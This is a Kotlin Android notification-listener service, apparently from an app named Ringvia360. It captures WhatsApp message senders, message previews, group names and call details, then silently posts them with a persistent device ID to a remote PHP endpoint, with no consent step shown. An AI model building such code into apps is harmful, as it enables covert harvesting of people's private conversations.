package com.ringvia360.phonewhtsapp.mobile_phone_whatsapp

import android.app.Notification
import android.content.Context
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.UUID

class WhatsAppNotificationListener : NotificationListenerService() {

    companion object {
        const val BASE_URL = "https://ringvia360.com/api/phone_whatsapp.php"
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        val packageName = sbn.packageName ?: return
        if (packageName != "com.whatsapp" && packageName != "com.whatsapp.w4b") return

        val notification = sbn.notification ?: return
        val extras = notification.extras ?: return

        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
            ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""

        if (title.isEmpty() && text.isEmpty()) return

        // Skip generic ongoing synchronization or backup notifications
        if (title.contains("WhatsApp Web", ignoreCase = true) ||
            title.contains("backup", ignoreCase = true) ||
            text.contains("Checking for new messages", ignoreCase = true)
        ) {
            return
        }

        // Determine if it is a WhatsApp Voice/Video Call
        val isCall = (notification.category == Notification.CATEGORY_CALL) ||
                text.contains("call", ignoreCase = true) ||
                text.contains("calling", ignoreCase = true) ||
                title.contains("voice call", ignoreCase = true) ||
                title.contains("video call", ignoreCase = true)

        val callDirection = when {
            text.contains("missed", ignoreCase = true) || title.contains("missed", ignoreCase = true) -> "missed"
            text.contains("calling", ignoreCase = true) || text.contains("outgoing", ignoreCase = true) -> "outbound"
            else -> "inbound"
        }
        val isVideo = text.contains("video", ignoreCase = true) || title.contains("video", ignoreCase = true)

        val groupName = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()
        val isoFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
        val timestamp = isoFormat.format(Date(sbn.postTime))
        val id = "wa_" + sbn.postTime + "_" + UUID.randomUUID().toString().substring(0, 4)

        val event = mapOf(
            "id" to id,
            "type" to "whatsapp_notification",
            "packageName" to packageName,
            "sender" to (if (title.isNotEmpty()) title else "WhatsApp Contact"),
            "messagePreview" to (if (text.isNotEmpty()) text else (if (isCall) "Incoming WhatsApp Call" else "New message")),
            "groupName" to groupName,
            "isCall" to isCall,
            "direction" to callDirection,
            "callType" to (if (isVideo) "video" else "voice"),
            "timestamp" to timestamp
        )

        TelemetryBridgeChannel.sendTelemetryEvent(event)

        // Asynchronously synchronize directly to server database in background thread
        Thread {
            try {
                val devicePrefs = getSharedPreferences("ringvia_prefs", Context.MODE_PRIVATE)
                var deviceId = devicePrefs.getString("device_unique_id", null)
                if (deviceId == null) {
                    val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                    deviceId = if (!androidId.isNullOrEmpty()) "dev_$androidId" else "dev_" + UUID.randomUUID().toString().substring(0, 8)
                    devicePrefs.edit().putString("device_unique_id", deviceId).apply()
                }

                val url = URL("$BASE_URL?action=whatsapp")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.connectTimeout = 15000
                conn.readTimeout = 15000

                val json = JSONObject().apply {
                    put("id", id)
                    put("deviceId", deviceId)
                    put("packageName", packageName)
                    put("sender", if (title.isNotEmpty()) title else "WhatsApp Contact")
                    put("messagePreview", if (text.isNotEmpty()) text else (if (isCall) "Incoming WhatsApp Call" else "New message"))
                    if (!groupName.isNullOrEmpty()) put("groupName", groupName)
                    put("isCall", isCall)
                    put("direction", callDirection)
                    put("callType", if (isVideo) "video" else "voice")
                    put("timestamp", timestamp)
                    put("syncStatus", "SYNCED")
                }

                OutputStreamWriter(conn.outputStream).use {
                    it.write(json.toString())
                    it.flush()
                }
                conn.responseCode
            } catch (_: Exception) {}
        }.start()
    }
}
